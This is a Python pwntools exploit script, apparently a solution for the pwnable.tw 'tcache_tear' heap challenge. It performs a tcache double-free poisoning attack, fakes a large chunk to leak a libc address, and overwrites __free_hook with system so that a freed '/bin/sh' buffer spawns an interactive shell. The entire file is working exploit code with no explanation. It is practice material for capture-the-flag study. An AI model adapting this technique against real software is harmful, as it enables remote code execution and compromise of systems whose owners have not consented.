from pwn import *
debug = 1
if debug:
	s= process('./tcache_tear')
	raw_input('debug')
	s.sendlineafter('Name:','tuan')
	system_offset = 0x4f440
	free_hook_offset = 0x3ed8e8
else:
	s = remote('chall.pwnable.tw', 10207)
	s.sendlineafter('Name:','tuan')
	e = ELF('libc-227.so')
	system_offset = e.symbols['system']
	free_hook_offset = e.symbols['__free_hook']
	

#main : 0x000000000400BC7
def malloc(size,data):
#0x0000000000400B14
	s.sendlineafter('Your choice :','1')
	s.sendlineafter('Size:',str(size))
	s.sendlineafter('Data:',data)
	log.info('malloc %x'%size)

def free():
#0x0000000000400C54
	s.sendlineafter('Your choice :','2')
	log.info('free')

def info():
#0x0000000000400B99
	s.sendlineafter('Your choice :','3')

malloc(0x70,'tuan')
free()
free()
malloc(0x70,p64(0x602050 + 0x500))
malloc(0x70,'tuan2')
payload = p64(0) + p64(0x21) + p64(0) * 3 + p64(0x51)
malloc(0x70,payload)
malloc(0x60,'tuan')
free()
free()
malloc(0x60,p64(0x602050))
malloc(0x60,'aaaa')
payload = p64(0) + p64(0x501) + p64(0) * 5 + p64(0x602050 + 0x10) 
malloc(0x60,payload)
free()
info()
s.recvuntil('Name :')

main_arena = u64(s.recv(8))-96
libc_base = main_arena-0x3ebc40
system_libc = libc_base + system_offset

free_hook_libc = libc_base+free_hook_offset
log.info("main_arena: 0x%x"%main_arena)
log.info("libc_base: 0x%x"%libc_base)
log.info("system_libc: 0x%x"%system_libc)
log.info("free_hook_libc: 0x%x"%free_hook_libc)

malloc(0x80,'tuan')
free()
free()
malloc(0x80,p64(free_hook_libc))
malloc(0x80,'tuan')
malloc(0x80,p64(system_libc))
malloc(0x30,'/bin/sh\x00')
free()

s.interactive()
s.close()